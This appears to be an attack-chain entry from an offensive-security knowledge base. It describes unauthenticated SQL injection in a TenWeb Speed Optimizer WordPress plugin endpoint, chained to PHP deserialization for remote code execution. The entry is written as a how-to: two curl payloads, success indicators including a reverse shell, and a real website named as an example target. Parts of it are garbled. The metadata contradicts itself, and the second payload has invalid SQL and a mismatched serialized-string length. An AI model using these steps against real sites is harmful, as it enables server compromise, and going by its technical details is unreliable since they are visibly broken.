---
id: attack-chain-uuid-1
tags:
  - sqli
  - rce
  - wordpress
  - deserialization
  - plugin-vulnerability
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - WordPress
  - PHP
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Unauthenticated-SQL-Injection-in-TenWeb-Endpoint]]'
  - '[[procedures/Chain-SQL-Injection-to-Insecure-Deserialization-for-RCE]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation of Remote Services]]'
updated_at: '2025-12-14T17:24:14.205Z'
description: >-
  A multi-stage attack exploiting an unauthenticated SQL injection in the TenWeb
  Speed Optimizer WordPress plugin to chain with insecure deserialization,
  achieving remote code execution on the target server.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation of Remote Services]]'
---
---
id: attack-chain-uuid-1
name: Unauthenticated SQL Injection Chained with Insecure Deserialization for RCE in TenWeb Speed Optimizer Plugin
type: attack_chain
description: A multi-stage attack exploiting an unauthenticated SQL injection in the TenWeb Speed Optimizer WordPress plugin to chain with insecure deserialization, achieving remote code execution on the target server.
verified: false
submitted: false
step_count: 2
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
procedures: [[procedures/Exploit-Unauthenticated-SQL-Injection-in-TenWeb-Endpoint]], [[procedures/Chain-SQL-Injection-to-Insecure-Deserialization-for-RCE]]
techniques: [[Exploit Public-Facing Application]], [[Exploitation of Remote Services]]
tactics: [[Initial Access]], [[Execution]]
tags: sqli, rce, wordpress, deserialization, plugin-vulnerability
platforms: Web, WordPress, PHP
tools: []
---

# Unauthenticated SQL Injection Chained with Insecure Deserialization for RCE in TenWeb Speed Optimizer Plugin

Multi-stage attack chain demonstrating a complete attack workflow targeting the TenWeb Speed Optimizer WordPress plugin (versions prior to 2.12.22). The attack begins with an unauthenticated SQL injection in the API endpoint to manipulate database contents, which is then chained to trigger insecure deserialization, resulting in remote code execution on the server hosting the WordPress site, such as krisp.ai.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: SQL Injection] --> B[Execution: Chain to Deserialization]
    B --> C[Privilege Escalation: RCE]
    C --> D[Objective: Server Compromise]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (manual exploitation via curl or similar HTTP client)

### Target Environment

- WordPress site with TenWeb Speed Optimizer plugin < 2.12.22
- Exposed /wp-json/tenwebio/v2/compress-one endpoint
- PHP backend

### Initial Access Requirements

- Network access to the target WordPress site (publicly accessible)
- No credentials required (unauthenticated)
- Prior access not needed

## Detailed Attack Procedures

### Step 1: Initial Access

procedure: [[procedures/Exploit-Unauthenticated-SQL-Injection-in-TenWeb-Endpoint]]

**Objective**: Exploit unauthenticated SQL injection to manipulate database data in the plugin's API endpoint.

**Instructions**: Target the /wp-json/tenwebio/v2/compress-one endpoint with a crafted payload to inject SQL. Use [[commands/curl-sqli-payload]] to send a basic SQL injection test:

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'url=1\' UNION SELECT 1,2,3--'
```

Verify injection by checking for database errors or unexpected responses indicating successful injection.

**Expected Output**: HTTP response with database error or altered output confirming SQL execution.

**Success Indicators**:
- Database error messages in response (e.g., MySQL syntax error)
- Ability to extract data via UNION SELECT

### Step 2: Execution

procedure: [[procedures/Chain-SQL-Injection-to-Insecure-Deserialization-for-RCE]]

**Objective**: Use the SQL injection to insert or manipulate serialized data that triggers insecure deserialization, leading to RCE.

**Instructions**: Leverage the SQLi to update a vulnerable table with a malicious serialized PHP object. First, identify the target table via SQLi, then inject a payload using [[commands/curl-deserialization-payload]]:

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'id=1\' AND (SELECT UPDATE wp_options SET option_value=\'O:4:"Test":1:{s:4:"exec";s:12:"system(id)";}\' WHERE option_name="test";--)--'
```

Trigger the deserialization by accessing a plugin function that unserializes the manipulated data, executing arbitrary code.

**Expected Output**: Server-side code execution, such as command output in response or file creation on server.

**Success Indicators**:
- Evidence of code execution (e.g., /tmp/test file created)
- Reverse shell or command output

## Attack Chain Summary

### Key Achievements

1. Unauthenticated access to database via SQL injection
2. Chaining to insecure deserialization for RCE
3. Full server compromise without authentication

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Exploitation of Remote Services]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
